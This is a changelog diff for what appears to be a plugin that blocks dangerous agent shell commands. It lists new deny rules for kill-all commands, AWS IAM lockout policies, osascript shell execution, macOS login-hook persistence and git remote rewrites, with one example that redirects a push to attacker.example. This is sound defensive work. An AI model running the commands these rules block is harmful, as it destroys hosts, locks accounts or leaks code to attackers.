@@ -4,6 +4,104 @@ All notable changes to this project are documented here. The format follows
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/) and this project
 adheres to [Semantic Versioning](https://semver.org/).
 
+## [1.1.0] - 2026-05-11
+
+### Added — new matchers
+
+- `bash.process_tree_kill`: `kill -9 -1`, `killall5`, and
+  `pkill -u <user>` / `killall -u <user>` are denied. Kill-all-reachable
+  shapes take down the session itself and leave the host unrecoverable.
+- AWS IAM policy mutations: `put-role-policy`, `put-user-policy`,
+  `put-group-policy`, `detach-*-policy`, and `update-assume-role-policy`
+  join the IAM `delete-*` deny set. Inline deny-all policies achieve
+  account lockout without a deletion to undo.
+- `osascript` joins the dangerous-interpreter set. `osascript -e
+  'do shell script "..."'` is a full macOS shell-exec primitive
+  equivalent to `sh -c`; the `-l JavaScript` variant is covered by the
+  same matcher.
+- `defaults write com.apple.loginwindow LoginHook …` (and any `*Hook`
+  key on the loginwindow / loginitems domain) is denied as a
+  persistence shape. Installs a script that runs at every macOS login.
+- `git remote add|set-url|rename|remove|rm|prune|update|set-head|set-branches`
+  are denied. The bare `git remote` (listing) and read-only forms
+  (`-v`, `show`, `get-url`) still pass through. Closes the
+  supply-chain redirect where `git remote set-url origin
+  https://attacker.example/evil.git` followed by `git push` quietly
+  pushes to the attacker.
+
+### Added — CLI log-query filters
+
+- `guard noisy`, `guard silent`, and `guard trace` accept `--decision`,
+  `--hook`, and `--tool` flags. `JsonlReader.iter_records` already
+  supported these filters internally; the CLI now exposes them so
+  questions like "did Claude touch a `Write` tool this week with a
+  `deny` decision?" need one command instead of `jq` plumbing.
+
+### Fixed
+
+- `subagent_scope`: relative paths in the Bash branch now resolve
+  against the *payload* `cwd` (the agent's working directory at
+  decide-time), not the hook process's cwd. Previously `echo x >
+  src/allowed.py` with payload cwd `/tmp/sess/` could be wrongly
+  denied if process cwd happened to be elsewhere.
+- `agent_output_guard`: the `.output` matcher no longer fires on
+  paths ending in `.output.bak` (or any `.output.<suffix>`). The
+  trailing negative-lookahead class was missing the `.` character.
+- `commit_message_validator._extract_all_messages` caps the scan
+  window at 8 KiB. `re.DOTALL` + backreference patterns could
+  backtrack quadratically on adversarial input (500 unclosed quotes,
+  ~250k backtracks on a 4 KB command); real commit-message argv
+  stays well under 8 KiB.
+
+### Polish — deny-message copy
+
+- Deny strings rewritten across `bash.gh_api_destructive`,
+  `bash.gpg_secret_delete`, `bash.process_attach`, `bash.kernel_module_load`,
+  `bash.network_policy_wipe`, `bash.sensitive_write`, `bash.persistence`,
+  `bash.sudo_escalation`, `bash.disk_destruction`, `bash.aws_destructive`,
+  and `bash.iac_destruction`. The "refuse." absolutism and matcher-internal
+  commentary ("refused regardless of flag ordering...") have been replaced
+  with a concrete next-step path (run in a controlled terminal, edit via
+  the Edit tool, review the plan output, etc.). The `_format_deny_reason`
+  footer still appends the override path, so the body is now consistently
+  threat-shape + alternative.
+
+### Test coverage
+
+- Direct regression tests added for previously-untested defensive paths:
+  `open_safe`'s `O_NOFOLLOW` symlink refusal (security-sensitive TOCTOU
+  guard); `_read_message_file`'s `ValueError`/`OSError` fallback;
+  `credential_check._expand`'s `OSError` fallback;
+  `_extract_all_messages`'s 8 KiB scan-window cap;
+  `git_c_validator._decide_stash`'s unknown-action fallthrough;
+  `agent_output_guard.hook`'s non-dict `tool_input` passthrough;
+  `allowlist._validate_allow_commands`'s non-list warning branch.
+
+### Packaging
+
+- CI + release smoke matrices now include Python 3.12 alongside 3.11
+  and 3.13, matching the `Programming Language :: Python :: 3.12`
+  classifier in `pyproject.toml`.
+
+### Docs
+
+- README hook table rows for `commit_message_validator`,
+  `agent_output_guard`, and `subagent_scope` now describe the
+  actual matchers (path-based, not size-based; file-edit scope,
+  not Task dispatch). Added `GUARD_PROTECTED_EXTRA` to the env
+  var table.
+- SKILL.md: `subagent_scope` description fixed to match
+  implementation; `--scope project|global` flag references replaced
+  with the actual `--global` / `--project` boolean pair; allowlist
+  CLI examples use the real `--rule` / `--command` / `--reason`
+  flag form; `GUARD_PROTECTED_EXTRA` file/env precedence wording
+  matches `protected_files._extra_patterns` (file replaces env,
+  not merges).
+- README "CLI never writes" claim narrowed — query subcommands
+  (`status`, `noisy`, `silent`, `trace`, `diff`, `test`) are
+  read-only, but `guard allowlist *` mutations write to the
+  allowlist file.
+
 ## [1.0.0] - 2026-05-09
 
 ### Added — allowlist (per-rule disable + per-command override)
@@ -13,8 +111,9 @@ adheres to [Semantic Versioning](https://semver.org/).
   forking the plugin. Project-scoped (`.claude/guard/allowlist.json`)
   and global (`~/.claude/guard/allowlist.json`) allowlists merge with
   project precedence. CLI: `guard allowlist {list,rules,disable-rule,
-  enable-rule,allow-command,remove-command}` with `--scope`. Every
-  bypass is logged as a `decision="pass"` audit record. See `SKILL.md`.
+  enable-rule,allow-command,remove-command}` with `--global` /
+  `--project` flags. Every bypass is logged as a `decision="pass"`
+  audit record. See `SKILL.md`.
 - `protected_files` trust-root: writes to `.claude/guard/allowlist.json`
   and `.claude/settings*.json` are NOT allowlist-bypassable — those
   files control whether guard runs at all and whether allowlist
